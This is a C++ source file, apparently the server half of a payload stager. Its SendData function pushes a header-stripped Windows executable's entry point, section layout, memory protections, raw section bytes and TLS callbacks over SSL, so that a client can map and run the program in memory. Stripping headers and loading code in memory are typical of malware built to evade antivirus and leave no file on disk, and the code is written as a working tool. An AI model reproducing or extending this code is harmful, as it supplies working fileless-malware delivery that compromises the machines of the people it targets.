#include "Pe Send to CLient.h"
#include <iostream>
#include <algorithm>

bool SendData(SSL* ssl, const ExtractedPEInfo& extractedInfo, const std::vector<BYTE>& peData) {
    try {
        std::cout << "[*] Sending PE data to client..." << std::endl;
        std::cout << "[*] PE data size: " << peData.size() << " bytes" << std::endl;

        // 1. Send entry point
        int bytesSent = SSL_write(ssl, &extractedInfo.entryPoint, sizeof(extractedInfo.entryPoint));
        if (bytesSent != sizeof(extractedInfo.entryPoint)) {
            std::cerr << "[!] Failed to send entry point" << std::endl;
            return false;
        }
        std::cout << "[*] Sent entry point: 0x" << std::hex << extractedInfo.entryPoint << std::dec << std::endl;

        // 2. Send section count
        bytesSent = SSL_write(ssl, &extractedInfo.sectionCount, sizeof(extractedInfo.sectionCount));
        if (bytesSent != sizeof(extractedInfo.sectionCount)) {
            std::cerr << "[!] Failed to send section count" << std::endl;
            return false;
        }
        std::cout << "[*] Sent section count: " << extractedInfo.sectionCount << std::endl;

        // 3. Send each section
        for (uint32_t i = 0; i < extractedInfo.sectionCount; i++) {
            const ExtractedSectionInfo& secInfo = extractedInfo.sections[i];

            // Determine if section data is available after header removal
            uint32_t adjustedDataSize = secInfo.dataSize;
            bool dataAvailable = false;

            if (secInfo.originalFileOffset < 1024 && secInfo.dataSize > 0) {
                // Section data was in the headers and is now lost
                std::cerr << "[!] Warning: Section " << i << " (" << secInfo.name
                    << ") data was in headers and is now lost!" << std::endl;
                adjustedDataSize = 0;
            }
            else if (secInfo.dataSize > 0) {
                // Data is available in headerless PE
                dataAvailable = true;
            }

            // Send section header info
            if (SSL_write(ssl, &secInfo.virtualAddress, sizeof(secInfo.virtualAddress)) != sizeof(secInfo.virtualAddress) ||
                SSL_write(ssl, &secInfo.virtualSize, sizeof(secInfo.virtualSize)) != sizeof(secInfo.virtualSize) ||
                SSL_write(ssl, &secInfo.protection, sizeof(secInfo.protection)) != sizeof(secInfo.protection) ||
                SSL_write(ssl, &secInfo.isCode, sizeof(secInfo.isCode)) != sizeof(secInfo.isCode) ||
                SSL_write(ssl, &adjustedDataSize, sizeof(adjustedDataSize)) != sizeof(adjustedDataSize)) {
                std::cerr << "[!] Failed to send section " << i << " header" << std::endl;
                return false;
            }

            std::cout << "[*] Sent section " << i << " (" << secInfo.name << ") header"
                << " - VA: 0x" << std::hex << secInfo.virtualAddress
                << ", Size: " << std::dec << adjustedDataSize << " bytes" << std::endl;

            // Send section data if available
            if (dataAvailable && adjustedDataSize > 0) {
                // Calculate offset in headerless PE (original offset - 1024)
                DWORD dataOffset = secInfo.originalFileOffset - 1024;

                // Verify we won't read out of bounds
                if (dataOffset + adjustedDataSize > peData.size()) {
                    std::cerr << "[!] Section " << i << " data extends beyond PE bounds!" << std::endl;
                    return false;
                }

                // Send data in chunks
                size_t totalSent = 0;
                const size_t chunkSize = 8192; // 8KB chunks

                while (totalSent < adjustedDataSize) {
                    size_t currentChunkSize = min(chunkSize, adjustedDataSize - totalSent);
                    int sent = SSL_write(ssl, peData.data() + dataOffset + totalSent,
                        static_cast<int>(currentChunkSize));
                    if (sent <= 0) {
                        std::cerr << "[!] Failed to send section " << i << " data at offset "
                            << totalSent << std::endl;
                        return false;
                    }
                    totalSent += sent;
                }

                std::cout << "[*] Sent " << totalSent << " bytes for section " << i
                    << " (from offset 0x" << std::hex << dataOffset << std::dec << ")" << std::endl;
            }
        }

        // 4. Send TLS callbacks
        uint32_t callbackCount = static_cast<uint32_t>(extractedInfo.tlsCallbacks.size());

        std::cout << "[*] Sending " << callbackCount << " TLS callbacks..." << std::endl;

        if (SSL_write(ssl, &callbackCount, sizeof(callbackCount)) != sizeof(callbackCount)) {
            std::cerr << "[!] Failed to send TLS callback count" << std::endl;
            return false;
        }

        for (const auto& callback : extractedInfo.tlsCallbacks) {
            if (SSL_write(ssl, &callback, sizeof(callback)) != sizeof(callback)) {
                std::cerr << "[!] Failed to send TLS callback" << std::endl;
                return false;
            }
            std::cout << "[*] Sent TLS callback: 0x" << std::hex << callback << std::dec << std::endl;
        }

        std::cout << "[+] Successfully sent all PE data to client" << std::endl;
        return true;

    }
    catch (const std::exception& e) {
        std::cerr << "[!] Exception during PE data transfer: " << e.what() << std::endl;
        return false;
    }
}